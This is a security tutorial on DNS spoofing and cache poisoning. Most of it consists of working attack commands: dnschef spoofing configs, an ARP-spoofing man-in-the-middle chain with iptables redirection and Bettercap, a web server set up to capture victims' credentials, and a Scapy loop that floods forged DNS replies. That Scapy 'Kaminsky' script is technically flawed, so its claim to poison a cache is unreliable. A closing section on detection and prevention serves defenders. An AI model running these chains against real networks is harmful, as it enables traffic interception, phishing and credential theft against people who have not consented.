# DNS Spoofing and Cache Poisoning Guide

## Introduction

DNS spoofing is the act of forging DNS responses to redirect victims to attacker-controlled servers instead of legitimate destinations. When combined with man-in-the-middle positioning through ARP spoofing, an attacker on the same network segment can intercept all DNS queries and respond with malicious IP addresses before the legitimate nameserver has a chance to reply. DNS cache poisoning extends this concept by injecting forged records into a caching DNS resolver's cache, causing all clients that use that resolver to be redirected for the duration of the cached entry's TTL. This guide covers dnschef for local DNS spoofing, the theory and practice of DNS cache poisoning, and integrating DNS spoofing into full MITM attack chains.

DNS spoofing is particularly effective because most applications and operating systems implicitly trust DNS responses without authentication. A forged response that arrives before the legitimate one is accepted without question. DNSSEC was designed to address this trust problem by cryptographically signing DNS records, but adoption remains incomplete, leaving the majority of DNS queries vulnerable to spoofing attacks.

---

## DNS Spoofing with dnschef

dnschef is a DNS proxy that intercepts and modifies DNS responses for specified domains, redirecting victims to attacker-specified IP addresses while passing through all other queries normally.

### Basic Spoofing

```bash
# Spoof all DNS queries to a single IP
dnschef --fakeip 192.168.1.100 --interface 0.0.0.0

# All queries will resolve to 192.168.1.100 regardless of the actual domain
```

### Targeted Domain Spoofing

```bash
# Spoof only specific domains, pass all others to real nameserver
dnschef --fakeip 192.168.1.100 --interface 0.0.0.0 --fakedomain target.com,mail.target.com

# Use a configuration file for per-domain control
cat > spoof_hosts.ini << 'EOF'
[A]
target.com = 192.168.1.100
www.target.com = 192.168.1.100
mail.target.com = 192.168.1.200
vpn.target.com = 10.10.10.50
EOF
dnschef --interface 0.0.0.0 --file spoof_hosts.ini

# Specify upstream nameserver for non-spoofed queries
dnschef --fakeip 192.168.1.100 --interface 0.0.0.0 --nameserver 8.8.8.8
```

### DNS Spoofing with IPv6

```bash
# Spoof AAAA records for IPv6 targets
dnschef --fakeipv6 2001:db8::100 --interface 0.0.0.0 --fakedomain target.com
```

---

## MITM Attack Chain with ARP Spoofing

DNS spoofing is most effective when combined with ARP spoofing to position the attacker as a man-in-the-middle. The attacker poisons the victim's ARP cache to intercept traffic, then intercepts DNS queries on port 53 and responds with spoofed answers.

### Attack Setup

```bash
# Step 1: Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Step 2: Start ARP spoofing (Terminal 1)
# Poison victim (192.168.1.50) to believe attacker is the gateway (192.168.1.1)
arpspoof -i eth0 -t 192.168.1.50 192.168.1.1

# Optional: Also poison gateway to believe attacker is the victim
arpspoof -i eth0 -t 192.168.1.1 192.168.1.50

# Step 3: Start DNS spoofing (Terminal 2)
dnschef --fakeip 192.168.1.100 --interface 0.0.0.0 --fakedomain target.com

# Step 4: Run attacker web server to capture credentials (Terminal 3)
python3 -m http.server 80
# Or use a phishing framework like Social Engineering Toolkit (SET)
```

### Using iptables for Transparent DNS Redirection

```bash
# Redirect all DNS traffic from victims to dnschef
iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 5353
iptables -t nat -A PREROUTING -p tcp --dport 53 -j REDIRECT --to-port 5353

# Start dnschef on the redirected port
dnschef --interface 0.0.0.0 --port 5353 --fakeip 192.168.1.100 --file spoof_hosts.ini
```

### Alternative: Bettercap for Integrated MITM

```bash
# Bettercap combines ARP spoofing and DNS spoofing in one tool
bettercap -iface eth0

# In Bettercap session:
net.probe on
set arp.spoof.targets 192.168.1.50
set dns.spoof.domains target.com, www.target.com
set dns.spoof.address 192.168.1.100
arp.spoof on
dns.spoof on
```

---

## DNS Cache Poisoning

DNS cache poisoning attacks target caching resolvers rather than individual clients. By injecting a forged DNS record into a resolver's cache, all clients using that resolver receive the malicious response until the TTL expires.

### How Cache Poisoning Works

1. Attacker sends a query to the target resolver for a domain they control (e.g., `test.attacker.com`)
2. The resolver forwards the query to the authoritative nameserver
3. Attacker races to send a forged response with the correct transaction ID before the real response arrives
4. The forged response includes an additional (glue) record for a different domain (e.g., `target.com A 192.168.1.100`)
5. The resolver caches the malicious record for the TTL duration
6. All subsequent queries to this resolver for `target.com` return the poisoned address

### Transaction ID Prediction

Early DNS implementations used sequential transaction IDs, making prediction trivial. Modern implementations use random IDs (16-bit space, 65,536 possibilities), but the Kaminsky attack technique bypasses this by flooding the resolver with many forged responses, each with a different transaction ID, racing against the legitimate response.

### Kaminsky Attack Concept

```bash
# The Kaminsky attack floods the resolver with forged responses
# Each forgery includes:
# - A randomized transaction ID (brute-forcing the 16-bit space)
# - The correct query name
# - A malicious additional record for the target domain
# - An authoritative (AA) flag

# Tools for cache poisoning testing:
# - The original Kaminsky proof-of-concept (not publicly released)
# - Various implementations in CTF toolkits
# - Custom scripts using Scapy for packet crafting

# Scapy-based cache poisoning test (authorized testing only)
python3 -c "
from scapy.all import *
import random

target_resolver = '192.168.1.1'
spoof_domain = 'target.com'
spoof_ip = '192.168.1.100'

# Craft and send forged DNS response
for txid in range(65536):
    dns_resp = IP(dst=target_resolver)/UDP(dport=53)/DNS(
        id=txid,
        qr=1,
        aa=1,
        qd=DNSQR(qname=spoof_domain),
        an=DNSRR(rrname=spoof_domain, rdata=spoof_ip, ttl=300)
    )
    send(dns_resp, verbose=0)
"
```

---

## DNS Spoofing Detection and Prevention

### Detection Techniques

```bash
# Monitor for DNS response anomalies
# Unexpected source IPs for DNS responses
tcpdump -i eth0 'udp port 53 and (src port 53) and not src net 192.168.1.0/24'

# Multiple responses for a single query (indicates spoofing attempt)
tcpdump -i eth0 'udp port 53' -w dns_capture.pcap

# Check for ARP spoofing (prerequisite for most DNS spoofing attacks)
arpwatch -i eth0
arp -a | sort  # Check for duplicate MAC addresses
```

### Prevention Measures

| Measure | Description | Effectiveness |
|---------|-------------|---------------|
| **DNSSEC** | Cryptographically signs DNS records, enabling resolvers to verify authenticity | High -- prevents spoofing of signed zones |
| **DNS-over-TLS (DoT)** | Encrypts DNS queries over TLS on port 853 | High -- prevents passive interception and spoofing |
| **DNS-over-HTTPS (DoH)** | Encrypts DNS queries within HTTPS on port 443 | High -- bypasses network-level DNS interception |
| **ARP Inspection** | Switch-level feature that validates ARP packets against a trusted database | High -- prevents ARP spoofing prerequisite |
| **Static DNS Entries** | Hardcode DNS entries for critical services on clients | Medium -- prevents spoofing for configured entries only |
| **Transaction ID Randomization** | Use unpredictable transaction IDs (standard in modern resolvers) | Medium -- raises the bar for blind spoofing |
| **Source Port Randomization** | Randomize the source port for DNS queries (standard since 2008) | Medium -- increases forgery difficulty |

---

## Operational Considerations

- DNS spoofing requires network-level access (same broadcast domain) for ARP-based MITM; it cannot be performed remotely without access to the DNS infrastructure itself
- Cache poisoning requires either predictable transaction IDs or the ability to flood the resolver with forged responses at high speed
- DNSSEC-signed zones are immune to both spoofing and cache poisoning for the signed records, but many domains remain unsigned
- When testing, always verify that the spoofing is working by checking the victim's DNS resolution from the victim's perspective, not just the attacker's
- dnschef logs all intercepted queries, providing valuable intelligence about the victim's browsing and service access patterns during the engagement
- Modern browsers may use DNS-over-HTTPS by default, which bypasses local DNS spoofing entirely -- check browser configuration during engagements

---

## References

- dnschef documentation: https://github.com/iphelix/dnschef
- Kaminsky DNS Attack Paper: https://www.unixwiz.net/techtips/iguide-kaminsky-dns-vuln.html
- DNSSEC Deployment Guide (ICANN): https://www.icann.org/resources/pages/dnssec-2012-02-25-en
- RFC 4033 (DNS Security Introduction): https://www.rfc-editor.org/rfc/rfc4033
- RFC 8484 (DNS-over-HTTPS): https://www.rfc-editor.org/rfc/rfc8484
- Bettercap DNS Spoofing: https://www.bettercap.org/modules/ethernet/spoofing/dns.spoof/
- HackTricks DNS Spoofing: https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns
